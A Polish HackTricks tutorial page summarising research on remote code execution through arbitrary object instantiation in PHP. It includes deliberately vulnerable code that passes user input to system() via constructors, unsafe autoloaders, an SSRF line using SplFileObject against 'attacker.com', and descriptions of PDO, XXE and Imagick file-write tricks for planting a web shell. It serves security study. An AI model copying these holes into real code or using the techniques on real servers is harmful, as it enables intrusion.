# PHP - RCE nadużywanie tworzenia obiektów: new $\_GET\["a"]\($\_GET\["b"])

{{#include ../../../banners/hacktricks-training.md}}

To jest zasadniczo podsumowanie [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Wprowadzenie

Tworzenie nowych, dowolnych obiektów, takich jak `new $_GET["a"]($_GET["a"])`, może prowadzić do zdalnego wykonania kodu (RCE), jak szczegółowo opisano w [**opisie**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Dokument ten podkreśla różne strategie osiągania RCE.

## RCE za pomocą klas niestandardowych lub autoloadingu

Składnia `new $a($b)` jest używana do instancjonowania obiektu, gdzie **`$a`** reprezentuje nazwę klasy, a **`$b`** jest pierwszym argumentem przekazywanym do konstruktora. Te zmienne mogą pochodzić z danych wejściowych użytkownika, takich jak GET/POST, gdzie mogą być ciągami lub tablicami, lub z JSON, gdzie mogą występować jako inne typy.

Rozważ poniższy fragment kodu:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
W tym przypadku ustawienie `$a` na `App` lub `App2` oraz `$b` na polecenie systemowe (np. `uname -a`) skutkuje wykonaniem tego polecenia.

**Funkcje autoloadingowe** mogą być wykorzystywane, jeśli takie klasy nie są bezpośrednio dostępne. Te funkcje automatycznie ładują klasy z plików w razie potrzeby i są definiowane za pomocą `spl_autoload_register` lub `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Zachowanie autoloadingu różni się w zależności od wersji PHP, oferując różne możliwości RCE.

## RCE za pomocą wbudowanych klas

Brakując niestandardowych klas lub autoloaderów, **wbudowane klasy PHP** mogą wystarczyć do RCE. Liczba tych klas waha się od 100 do 200, w zależności od wersji PHP i rozszerzeń. Można je wylistować za pomocą `get_declared_classes()`.

Konstruktory, które mogą być interesujące, można zidentyfikować za pomocą API refleksji, jak pokazano w poniższym przykładzie oraz w linku [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE za pomocą konkretnych metod obejmuje:**

### **SSRF + Deserializacja Phar**

Klasa `SplFileObject` umożliwia SSRF poprzez swój konstruktor, pozwalając na połączenia z dowolnym URL:
```php
new SplFileObject('http://attacker.com/');
```
SSRF może prowadzić do ataków deserializacji w wersjach PHP przed 8.0 przy użyciu protokołu Phar.

### **Wykorzystywanie PDO**

Konstruktor klasy PDO umożliwia połączenia z bazami danych za pomocą ciągów DSN, co potencjalnie umożliwia tworzenie plików lub inne interakcje:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Wersje PHP do 5.3.22 i 5.4.12 były podatne na ataki XXE za pośrednictwem konstruktorów `SoapClient` i `SimpleXMLElement`, w zależności od wersji libxml2.

## RCE za pomocą rozszerzenia Imagick

W analizie **zależności projektu** odkryto, że **Imagick** może być wykorzystany do **wykonywania poleceń** poprzez instancjonowanie nowych obiektów. Stwarza to możliwość wykorzystania luk w zabezpieczeniach.

### Parser VID

Zidentyfikowano zdolność parsera VID do zapisywania treści w dowolnie określonej ścieżce w systemie plików. Może to prowadzić do umieszczenia powłoki PHP w katalogu dostępnym przez sieć, osiągając zdalne wykonanie kodu (RCE).

#### Parser VID + Przesyłanie plików

Zauważono, że PHP tymczasowo przechowuje przesyłane pliki w `/tmp/phpXXXXXX`. Parser VID w Imagick, wykorzystując protokół **msl**, może obsługiwać znaki wieloznaczne w ścieżkach plików, co ułatwia przeniesienie tymczasowego pliku do wybranej lokalizacji. Ta metoda oferuje dodatkowe podejście do osiągnięcia dowolnego zapisu plików w systemie plików.

### Awaria PHP + Brute Force

Metoda opisana w [**oryginalnym opisie**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) polega na przesyłaniu plików, które powodują awarię serwera przed usunięciem. Poprzez brute forcing nazwy tymczasowego pliku, możliwe jest, aby Imagick wykonał dowolny kod PHP. Jednak ta technika okazała się skuteczna tylko w przestarzałej wersji ImageMagick.

## References

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

{{#include ../../../banners/hacktricks-training.md}}
